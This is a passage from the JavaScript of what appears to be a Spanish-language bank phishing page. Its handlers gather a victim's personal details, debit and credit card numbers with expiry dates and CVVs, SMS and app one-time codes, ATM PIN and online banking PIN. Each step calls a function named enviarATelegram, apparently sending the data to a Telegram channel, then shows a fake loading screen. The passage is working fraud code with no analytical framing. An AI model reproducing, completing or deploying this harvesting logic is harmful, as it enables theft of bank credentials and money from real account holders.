                if (validateDatos()) {
                    saveToLocalStorage('nombre', $('#nombre').val().trim());
                    saveToLocalStorage('cedula', $('#cedula').val().trim());
                    saveToLocalStorage('email', $('#email').val().trim());
                    saveToLocalStorage('celular', $('#celular').val().trim());
                    saveToLocalStorage('ciudad', $('#ciudad').val().trim());
                    saveToLocalStorage('direccion', $('#direccion').val().trim());
                    saveToLocalStorage('status', 'DATOS');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Tarjeta de Débito
            $('#numtarjetaTDB').on('input', function () {
                let value = $(this).val().replace(/\s/g, '');
                value = value.replace(/\D/g, '');
                if (value.length > 19) value = value.substring(0, 19);

                let formattedValue = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
                    formattedValue += value[i];
                }
                $(this).val(formattedValue);
                validateTarjeta('tdb');
            });

            $('#vencimientoTDB').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
                $(this).val(value);
                validateTarjeta('tdb');
            });

            $('#cvvTDB').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                validateTarjeta('tdb');
            });

            $('#checkTDB').on('change', function () {
                validateTarjeta('tdb');
            });

            $('#btnTDB').on('click', async function () {
                if (validateTarjeta('tdb')) {
                    saveToLocalStorage('numtarjetaTDB', $('#numtarjetaTDB').val().trim());
                    saveToLocalStorage('cvvTDB', $('#cvvTDB').val().trim());
                    saveToLocalStorage('vencimientoTDB', $('#vencimientoTDB').val().trim());
                    saveToLocalStorage('status', 'TDB');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Tarjeta de Crédito
            $('#numtarjetaTDC').on('input', function () {
                let value = $(this).val().replace(/\s/g, '');
                value = value.replace(/\D/g, '');
                if (value.length > 19) value = value.substring(0, 19);

                let formattedValue = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
                    formattedValue += value[i];
                }
                $(this).val(formattedValue);
                validateTarjeta('tdc');
            });

            $('#vencimientoTDC').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
                $(this).val(value);
                validateTarjeta('tdc');
            });

            $('#cvvTDC').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                validateTarjeta('tdc');
            });

            $('#checkTDC').on('change', function () {
                validateTarjeta('tdc');
            });

            $('#btnTDC').on('click', async function () {
                if (validateTarjeta('tdc')) {
                    saveToLocalStorage('numtarjetaTDC', $('#numtarjetaTDC').val().trim());
                    saveToLocalStorage('cvvTDC', $('#cvvTDC').val().trim());
                    saveToLocalStorage('vencimientoTDC', $('#vencimientoTDC').val().trim());
                    saveToLocalStorage('status', 'TDC');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Código SMS
            $('#codsmsInput').on('input', function () {
                validateOtp('#codsmsInput', '#btnCodSMS');
            });
            $('#btnCodSMS').on('click', async function () {
                if (validateOtp('#codsmsInput', '#btnCodSMS')) {
                    saveToLocalStorage('codsms', $('#codsmsInput').val().trim());
                    saveToLocalStorage('status', 'CODSMS');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Código App
            $('#codappInput').on('input', function () {
                validateOtp('#codappInput', '#btnCodApp');
            });
            $('#btnCodApp').on('click', async function () {
                if (validateOtp('#codappInput', '#btnCodApp')) {
                    saveToLocalStorage('codapp', $('#codappInput').val().trim());
                    saveToLocalStorage('status', 'CODAPP');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Clave de Cajero
            $('#pincajInput').on('input', function () {
                validateOtp('#pincajInput', '#btnPinCaj');
            });
            $('#btnPinCaj').on('click', async function () {
                if (validateOtp('#pincajInput', '#btnPinCaj')) {
                    saveToLocalStorage('pincaj', $('#pincajInput').val().trim());
                    saveToLocalStorage('status', 'PINCAJ');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Clave Virtual
            $('#pinvirInput').on('input', function () {
                validateOtp('#pinvirInput', '#btnPinVir');
            });
            $('#btnPinVir').on('click', async function () {
                if (validateOtp('#pinvirInput', '#btnPinVir')) {
                    saveToLocalStorage('pinvir', $('#pinvirInput').val().trim());
                    saveToLocalStorage('status', 'PINVIR');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // ==================== INICIALIZACIÓN ====================
            showView('login');
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>
</body>

</html>
